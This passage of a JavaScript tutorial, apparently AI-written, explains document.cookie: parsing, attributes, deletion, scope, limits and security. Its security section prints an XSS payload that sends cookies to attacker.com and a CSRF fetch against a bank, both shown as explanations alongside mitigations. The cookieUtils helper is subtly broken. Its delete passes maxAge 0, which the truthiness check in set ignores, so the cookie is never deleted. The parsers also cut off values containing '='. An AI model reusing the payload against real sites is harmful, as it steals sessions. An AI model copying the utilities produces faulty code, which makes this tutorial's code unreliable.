**[Inference]** Historical browser differences:

**Old IE (8 and below)**

- Used different event model
- Required `attachEvent` instead of `addEventListener`
- `DOMContentLoaded` not supported (used readyState workarounds)

**Modern Browsers**

- All modern browsers consistently support both events
- Timing is largely standardized
- Minor variations in exact millisecond timing but event order is consistent

**Mobile Browsers**

- Same event model as desktop
- May have different performance characteristics
- `load` event can be significantly delayed on slow connections

---

## document.cookie

### Reading Cookies

`document.cookie` returns a **semicolon-separated string** of all accessible cookies for the current document:

```javascript
document.cookie
// "sessionId=abc123; userId=456; theme=dark; language=en"

// Parse into object
function getCookies() {
  return document.cookie
    .split('; ')
    .reduce((acc, cookie) => {
      const [name, value] = cookie.split('=');
      acc[name] = decodeURIComponent(value);
      return acc;
    }, {});
}

// Get specific cookie
function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) {
    return decodeURIComponent(parts.pop().split(';').shift());
  }
  return null;
}
```

### Setting Cookies

Setting cookies uses **assignment syntax**, but doesn't overwrite existing cookies—it adds or updates a single cookie:

```javascript
// Basic syntax
document.cookie = "username=john";

// Multiple calls add multiple cookies
document.cookie = "sessionId=abc123";
document.cookie = "theme=dark";
// Both cookies now exist

// Value encoding (required for special characters)
const value = "user@example.com";
document.cookie = `email=${encodeURIComponent(value)}`;

// Overwrite existing cookie by using same name
document.cookie = "theme=light"; // Replaces theme=dark
```

### Cookie Attributes

Attributes are appended to the cookie string, separated by semicolons:

**expires**

```javascript
// Set expiration date
const date = new Date();
date.setTime(date.getTime() + (7 * 24 * 60 * 60 * 1000)); // 7 days
document.cookie = `token=xyz; expires=${date.toUTCString()}`;

// Without expires or max-age, cookie is session-only (deleted when browser closes)
document.cookie = "tempData=123"; // Session cookie
```

**max-age**

```javascript
// Seconds until expiration (preferred over expires)
document.cookie = "token=xyz; max-age=604800"; // 7 days in seconds

// max-age takes precedence over expires if both present
document.cookie = "token=xyz; max-age=3600; expires=..."; // max-age wins

// Negative or zero max-age deletes cookie
document.cookie = "token=xyz; max-age=0";
```

**path**

```javascript
// Cookie accessible only on specified path and its subdirectories
document.cookie = "data=value; path=/admin";
// Accessible on: /admin, /admin/users, /admin/settings
// NOT accessible on: /, /login, /profile

// Root path (default if omitted)
document.cookie = "data=value; path=/";
// Accessible on all paths

// Current path
document.cookie = "data=value; path=" + window.location.pathname;
```

**domain**

```javascript
// Cookie accessible on specified domain and subdomains
document.cookie = "token=xyz; domain=example.com";
// Accessible on: example.com, www.example.com, api.example.com

// Without domain attribute, cookie is only accessible on exact host
// On subdomain.example.com:
document.cookie = "token=xyz"; // Only accessible on subdomain.example.com

// Cannot set cookie for different domain or TLD
document.cookie = "token=xyz; domain=otherdomain.com"; // Ignored
document.cookie = "token=xyz; domain=.com"; // Ignored

// Leading dot is optional and ignored
document.cookie = "token=xyz; domain=.example.com"; // Same as domain=example.com
```

**secure**

```javascript
// Cookie only sent over HTTPS
document.cookie = "token=xyz; secure";

// On HTTP site, secure flag is ignored
// On HTTPS site, cookie won't be sent over HTTP requests

// Recommended for sensitive data
document.cookie = "sessionToken=abc; secure; max-age=3600";
```

**SameSite**

```javascript
// Strict: Cookie never sent on cross-site requests
document.cookie = "csrf=token; SameSite=Strict";
// Not sent when clicking link from external site
// Not sent in iframe, fetch from different origin

// Lax (default in modern browsers): Cookie sent on top-level navigation
document.cookie = "session=abc; SameSite=Lax";
// Sent when clicking link from external site
// NOT sent on cross-site POST, iframe, or fetch requests

// None: Cookie sent on all requests (requires Secure)
document.cookie = "tracking=xyz; SameSite=None; Secure";
// Must include Secure flag when SameSite=None
```

**HttpOnly**

```javascript
// Cannot be set via JavaScript
// Must be set by server in Set-Cookie header
// Set-Cookie: sessionId=abc123; HttpOnly

// JavaScript cannot read or modify HttpOnly cookies
document.cookie = "test=value; HttpOnly"; // HttpOnly flag ignored
// Cookie is created but WITHOUT HttpOnly protection

// HttpOnly cookies don't appear in document.cookie
console.log(document.cookie); // Won't include HttpOnly cookies
```

### Deleting Cookies

```javascript
// Set expiration to past date
document.cookie = "username=; expires=Thu, 01 Jan 1970 00:00:00 UTC";

// Or use max-age=0
document.cookie = "username=; max-age=0";

// Must match path and domain of original cookie
document.cookie = "token=; path=/admin; max-age=0";
document.cookie = "token=; domain=example.com; path=/; max-age=0";

// Helper function
function deleteCookie(name, path = '/', domain = '') {
  const domainStr = domain ? `; domain=${domain}` : '';
  document.cookie = `${name}=; path=${path}${domainStr}; max-age=0`;
}
```

### Size Limits

Browser-imposed restrictions:

- **Per cookie**: ~4KB (4096 bytes) including name, value, and attributes
- **Per domain**: 20-50+ cookies (varies by browser)
- **Total**: ~4KB limit includes all cookies for the domain combined in some browsers

```javascript
// Check if cookie was set successfully
function setCookieWithCheck(name, value) {
  const testValue = `${name}=${encodeURIComponent(value)}`;
  if (testValue.length > 4096) {
    console.warn('Cookie exceeds 4KB limit');
    return false;
  }
  
  document.cookie = testValue;
  
  // Verify it was set
  return getCookie(name) === value;
}
```

Exceeding limits results in:

- Cookie silently rejected
- Oldest cookies deleted to make room (browser-dependent)
- Unpredictable behavior across browsers

### Same-Origin Policy and Cookie Scope

Cookies follow **domain-based** access, not origin-based:

```javascript
// Origin: https://example.com:443
// Can access cookies for:
// - example.com
// - .example.com (includes all subdomains)

// Origin: https://sub.example.com
// Can access cookies for:
// - sub.example.com
// - .example.com (if domain=example.com was set)

// CANNOT access cookies from:
// - Different domain (otherdomain.com)
// - Parent domain (if cookie didn't specify domain=example.com)
```

Unlike localStorage (origin-bound: protocol + domain + port), cookies ignore port and protocol (unless Secure flag):

```javascript
// http://example.com:8080 and https://example.com:443
// Share cookies UNLESS Secure flag prevents HTTP access

// localStorage is isolated:
// http://example.com and https://example.com have separate localStorage
```

### Cookie Encoding

Special characters must be encoded:

```javascript
// Characters requiring encoding
const specialChars = "; , =";

// Bad: Creates invalid cookie
document.cookie = "data=user;admin"; // Semicolon breaks parsing

// Good: Encode value
document.cookie = `data=${encodeURIComponent("user;admin")}`;
// Result: data=user%3Badmin

// Decode when reading
const value = decodeURIComponent(getCookie('data')); // "user;admin"
```

Characters that need encoding:

- Semicolon (;) - cookie delimiter
- Comma (,) - cookie separator in Set-Cookie
- Equals (=) - name-value separator
- Spaces
- Non-ASCII characters

Cookie **names** can contain most characters except:

- Control characters
- Whitespace
- Semicolon, comma, equals
- Non-ASCII (browser-dependent)

### Reading Performance

```javascript
// document.cookie parses entire cookie string on each access
for (let i = 0; i < 100; i++) {
  const value = getCookie('username'); // 100 parse operations
}

// Cache parsed cookies
const cookies = getCookies(); // Parse once
for (let i = 0; i < 100; i++) {
  const value = cookies.username; // No parsing
}
```

Each `document.cookie` read:

1. Concatenates all accessible cookies
2. Returns entire string
3. JavaScript must parse string

For frequent access, parse once and cache results.

### Writing Performance and Browser Behavior

```javascript
// Each write triggers browser operations
document.cookie = "a=1"; // Write to cookie jar, sync to disk
document.cookie = "b=2"; // Separate write operation
document.cookie = "c=3"; // Another write

// No native batch API exists
// Minimize writes when possible
```

[Inference] Browsers may batch writes internally, but this is implementation-dependent. Sequential writes in tight loops may cause performance degradation.

### Cookie Updates and Race Conditions

```javascript
// Reading and updating is not atomic
const current = getCookie('counter'); // Read
const newValue = parseInt(current || '0') + 1;
document.cookie = `counter=${newValue}`; // Write

// Race condition: Concurrent tabs/windows can overwrite
// Tab A reads: counter=5
// Tab B reads: counter=5
// Tab A writes: counter=6
// Tab B writes: counter=6
// Result: Lost increment
```

Cookies don't support atomic operations. For concurrent access:

- Use server-side state
- Use localStorage with storage events for coordination
- Accept potential data loss for non-critical data

### Third-Party Cookies

```javascript
// On site-a.com, loads iframe from site-b.com
// site-b.com can set cookies in its context

// site-b.com code:
document.cookie = "tracking=xyz; SameSite=None; Secure";
// Required: SameSite=None and Secure for cross-site context

// Browser behavior varies:
// - Chrome/Edge: Block third-party cookies by default (2024+)
// - Firefox: Blocks by default
// - Safari: Intelligent Tracking Prevention blocks most
```

[Unverified] Browser third-party cookie policies continue evolving. Relying on third-party cookies for functionality may break as browser privacy features advance.

### Subdomain Cookie Sharing

```javascript
// On app.example.com:
document.cookie = "shared=data; domain=example.com; path=/";
// Accessible on: example.com, app.example.com, api.example.com

// On app.example.com:
document.cookie = "isolated=data"; // No domain specified
// ONLY accessible on: app.example.com

// On example.com:
document.cookie = "parent=data; domain=example.com";
// Accessible on: example.com and all subdomains

// Cannot set for parent domain from subdomain without explicit domain attribute
```

Common pattern for SSO (Single Sign-On):

```javascript
// Auth service on auth.example.com sets:
document.cookie = "authToken=xyz; domain=example.com; secure; SameSite=Lax";
// Now accessible across all *.example.com subdomains
```

### Path Behavior Nuances

```javascript
// Cookie set with path=/admin
document.cookie = "data=value; path=/admin";

// Accessible on:
// /admin ✓
// /admin/ ✓
// /admin/users ✓
// /admin/settings/profile ✓

// NOT accessible on:
// / ✗
// /administrator ✗
// /public ✗

// Path matching is prefix-based, not exact
// More specific paths shadow less specific ones with same name
document.cookie = "token=general; path=/";
document.cookie = "token=admin; path=/admin";
// On /admin/users: getCookie('token') returns 'admin'
// On /profile: getCookie('token') returns 'general'
```

### Cookie Order in document.cookie

```javascript
// Cookie order in returned string is browser-dependent
document.cookie = "first=1";
document.cookie = "second=2";
document.cookie = "third=3";

console.log(document.cookie);
// Might be: "first=1; second=2; third=3"
// Or: "third=3; first=1; second=2"
// Or: any other order
```

[Unverified] The order is not specified by standards. Do not rely on cookie order for logic. Always parse by name.

### Cookie Visibility Across Windows/Tabs

```javascript
// Cookies are shared across all tabs/windows of same origin
// Tab 1:
document.cookie = "shared=data";

// Tab 2 (same origin):
console.log(getCookie('shared')); // Returns "data"

// But no synchronization event exists
// Tab 2 must manually re-read document.cookie to see updates
```

Unlike localStorage (fires `storage` event), cookies have no change notification mechanism. Polling is required for real-time synchronization:

```javascript
// Poll for cookie changes
let lastCookieValue = getCookie('watched');

setInterval(() => {
  const currentValue = getCookie('watched');
  if (currentValue !== lastCookieValue) {
    console.log('Cookie changed:', currentValue);
    lastCookieValue = currentValue;
  }
}, 1000);
```

### Interaction with HTTP Headers

Server can set cookies via `Set-Cookie` header:

```
Set-Cookie: sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Max-Age=3600
```

JavaScript sees non-HttpOnly cookies in `document.cookie`:

```javascript
// After server sets multiple cookies:
// Set-Cookie: userId=123
// Set-Cookie: sessionToken=xyz; HttpOnly
// Set-Cookie: preferences=theme:dark

console.log(document.cookie);
// "userId=123; preferences=theme:dark"
// sessionToken is invisible due to HttpOnly
```

JavaScript sends cookies automatically with fetch/XHR to same origin:

```javascript
// Browser includes cookies in request headers automatically
fetch('/api/data'); // Cookies sent: Cookie: userId=123; preferences=theme:dark

// For cross-origin requests, credentials must be explicit
fetch('https://api.example.com/data', {
  credentials: 'include' // Required for cross-origin cookie sending
});
```

### Security Considerations

**XSS vulnerability:**

```javascript
// Attacker injects script
const malicious = "<script>new Image().src='http://attacker.com?c='+document.cookie</script>";

// If inserted into DOM without sanitization:
element.innerHTML = userInput; // Executes script, steals cookies

// Mitigation:
// 1. HttpOnly flag (server-side) - prevents JavaScript access
// 2. Sanitize user input
// 3. Use textContent instead of innerHTML
// 4. CSP (Content Security Policy)
```

**CSRF vulnerability:**

```javascript
// Cookies sent automatically with requests
// Attacker site makes request to victim site:
fetch('https://bank.com/transfer?to=attacker&amount=1000', {
  method: 'POST',
  credentials: 'include' // Browser sends victim's cookies
});

// Mitigation:
// 1. SameSite=Strict or Lax
// 2. CSRF tokens
// 3. Check Referer/Origin headers
```

**Subdomain takeover:**

```javascript
// Attacker controls subdomain.example.com
// Can set cookies for .example.com
document.cookie = "sessionId=malicious; domain=example.com";
// Overwrites legitimate session on main domain

// Mitigation:
// 1. Don't use domain attribute unless necessary
// 2. Validate subdomain ownership
// 3. Use __Host- or __Secure- prefixes
```

### Cookie Prefixes

Special name prefixes provide additional security:

```javascript
// __Secure- prefix
document.cookie = "__Secure-token=xyz; Secure";
// Requirements:
// - Must include Secure flag
// - Must be set from HTTPS

// __Host- prefix
document.cookie = "__Host-token=xyz; Secure; Path=/";
// Requirements:
// - Must include Secure flag
// - Must be set from HTTPS
// - Must have Path=/
// - Must NOT have Domain attribute (bound to exact host)

// Browser rejects cookies if requirements not met
document.cookie = "__Host-token=xyz"; // Rejected: missing Secure and Path
document.cookie = "__Host-token=xyz; Secure; Path=/; domain=example.com"; // Rejected: has domain
```

These prefixes prevent:

- Setting from subdomain for parent domain (__Host-)
- Setting from HTTP (__Secure-, __Host-)
- Downgrade attacks

### Practical Utility Functions

```javascript
// Complete cookie management
const cookieUtils = {
  set(name, value, options = {}) {
    let cookie = `${encodeURIComponent(name)}=${encodeURIComponent(value)}`;
    
    if (options.maxAge) cookie += `; max-age=${options.maxAge}`;
    else if (options.expires) cookie += `; expires=${options.expires.toUTCString()}`;
    
    if (options.path) cookie += `; path=${options.path}`;
    if (options.domain) cookie += `; domain=${options.domain}`;
    if (options.secure) cookie += '; secure';
    if (options.sameSite) cookie += `; SameSite=${options.sameSite}`;
    
    document.cookie = cookie;
  },
  
  get(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${encodeURIComponent(name)}=`);
    if (parts.length === 2) {
      return decodeURIComponent(parts.pop().split(';').shift());
    }
    return null;
  },
  
  delete(name, options = {}) {
    this.set(name, '', { ...options, maxAge: 0 });
  },
  
  getAll() {
    return document.cookie
      .split('; ')
      .filter(Boolean)
      .reduce((acc, cookie) => {
        const [name, value] = cookie.split('=');
        acc[decodeURIComponent(name)] = decodeURIComponent(value);
        return acc;
      }, {});
  }
};

// Usage
cookieUtils.set('user', 'john', { maxAge: 3600, path: '/', secure: true, sameSite: 'Strict' });
const user = cookieUtils.get('user');
cookieUtils.delete('user', { path: '/' });
```

---

